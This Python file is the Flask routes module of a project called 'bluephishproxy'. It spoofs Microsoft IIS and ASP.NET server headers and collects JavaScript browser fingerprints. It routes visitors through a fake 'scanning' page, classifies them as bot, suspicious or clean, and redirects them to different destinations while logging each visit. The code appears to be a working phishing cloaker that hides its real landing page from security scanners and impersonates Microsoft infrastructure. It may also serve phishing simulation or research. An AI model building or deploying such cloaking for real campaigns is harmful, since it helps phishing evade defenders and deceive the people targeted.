"""Flask application factory and routes."""

from __future__ import annotations

import logging
import random
import uuid
from typing import Any

from flask import (
    Flask,
    Request,
    make_response,
    redirect,
    request,
    session,
    jsonify,
)
from werkzeug.middleware.proxy_fix import ProxyFix

from .config import Config
from .detection import build_visit_record, evaluate
from .fingerprint import enrich_ip
from .storage import log_visit, save_visit, update_analytics
from .templates import blocked_page_html, scan_page_html

logger = logging.getLogger("bluephishproxy")

MS_SERVER_TYPES = [
    "Microsoft-IIS/10.0",
    "Microsoft-HTTPAPI/2.0",
    "Microsoft-IIS/10.0",
]
MS_POWERED_BY = ["ASP.NET", "ARR/3.0", "ASP.NET 4.8"]


def _ms_headers() -> dict[str, str]:
    return {
        "Server": random.choice(MS_SERVER_TYPES),
        "X-Powered-By": random.choice(MS_POWERED_BY),
        "X-AspNet-Version": "4.0.30319",
        "X-MS-InvokeApp": "1; RequireReadOnly",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "SAMEORIGIN",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    }


def _extract_ip(req: Request) -> str:
    xff = req.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return req.remote_addr or "0.0.0.0"


def _apply_ms_headers(response: Any) -> Any:
    for k, v in _ms_headers().items():
        response.headers[k] = v
    return response


def create_app(cfg: Config | None = None) -> Flask:
    if cfg is None:
        cfg = Config()

    app = Flask(__name__)

    if cfg.secret_key_is_ephemeral:
        logger.warning(
            "BPP_SECRET_KEY is not set — generating ephemeral key. "
            "Session cookies will not survive restarts."
        )
    app.secret_key = cfg.resolved_secret_key()

    app.wsgi_app = ProxyFix(  # type: ignore[assignment]
        app.wsgi_app,
        x_for=cfg.trusted_proxies,
        x_host=cfg.trusted_proxies,
    )

    cfg.data_dir.mkdir(parents=True, exist_ok=True)
    cfg.analytics_dir.mkdir(parents=True, exist_ok=True)

    # ------------------------------------------------------------------
    # Metrics collection endpoint (receives JS fingerprint payload)
    # ------------------------------------------------------------------
    @app.route("/api/v2/metrics/collect", methods=["POST"])
    def collect_metrics():  # type: ignore[return]
        data: dict[str, Any] = request.json or {}
        session["adv_metrics"] = data
        session["metrics_ts"] = data.get("elapsed")
        resp = jsonify({"status": "ok"})
        return _apply_ms_headers(resp)

    # ------------------------------------------------------------------
    # Scanning interstitial
    # ------------------------------------------------------------------
    @app.route("/api/v2/metrics/usr")
    @app.route("/scanning_page")
    def scan_page():  # type: ignore[return]
        resp = make_response(scan_page_html(cfg.brand_name))
        return _apply_ms_headers(resp)

    # ------------------------------------------------------------------
    # Analytics API (operator-only, bind to localhost in prod)
    # ------------------------------------------------------------------
    @app.route("/api/v2/analytics/summary")
    def analytics_summary():  # type: ignore[return]
        from .reporting import generate_markdown

        md = generate_markdown(cfg)
        resp = make_response(md)
        resp.content_type = "text/markdown; charset=utf-8"
        return _apply_ms_headers(resp)

    # ------------------------------------------------------------------
    # Catch-all: profile → decide → redirect or block
    # ------------------------------------------------------------------
    @app.route("/", defaults={"uri": ""})
    @app.route("/<path:uri>")
    def catch_all(uri: str):  # type: ignore[return]
        session_id = request.cookies.get("csession", str(uuid.uuid4()))
        ip = _extract_ip(request)
        ua = request.headers.get("User-Agent", "")
        headers = dict(request.headers)
        js_metrics: dict[str, Any] | None = session.get("adv_metrics")
        elapsed_ms: float | None = session.get("metrics_ts")

        record = build_visit_record(
            ip=ip,
            user_agent=ua,
            headers=headers,
            cookies=dict(request.cookies),
            path=request.path,
            method=request.method,
            args=dict(request.args),
            referrer=request.referrer,
            session_id=session_id,
            js_metrics=js_metrics,
            elapsed_ms=elapsed_ms,
            cfg=cfg,
        )

        log_visit(record)
        save_visit(record, cfg)
        update_analytics(record, cfg)

        classification = record.get("classification", "clean")

        if not js_metrics:
            resp = redirect("/api/v2/metrics/usr", code=302)
        elif classification == "bot":
            resp = make_response(blocked_page_html(cfg.brand_name), 200)
        elif classification == "suspicious":
            resp = redirect(cfg.flagged_redirect_url, code=302)
        else:
            resp = redirect(cfg.safe_redirect_url, code=302)

        resp = _apply_ms_headers(resp)
        resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
        return resp

    return app
